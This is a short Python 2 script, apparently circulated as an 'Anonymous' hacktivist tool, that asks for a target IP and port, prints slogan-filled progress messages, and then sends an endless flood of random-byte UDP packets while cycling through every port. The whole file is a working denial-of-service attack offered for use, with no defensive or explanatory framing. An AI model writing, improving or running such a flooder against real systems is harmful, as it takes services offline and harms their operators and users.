import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("We are Anonymous indonesia #OpIndonesia")
os.system("Anonymous DDos Attack")
print
print "WELLCOME TO ANONYMOUS DDOS ATTACK TOOLS"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet Attack Starting")
print "[we are Anonymous] 0% "
time.sleep(5)
print "[we are Legion] 25%"
time.sleep(5)
print "[we do not Forgive] 50%"
time.sleep(5)
print "[we do not Forget] 75%"
time.sleep(5)
print "[EXPECT US] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "DC6 Sent %s packet @bot to %s throught port:%s [CONNECTED]"%(sent,ip,port)
     if port == 65534:
       port = 1

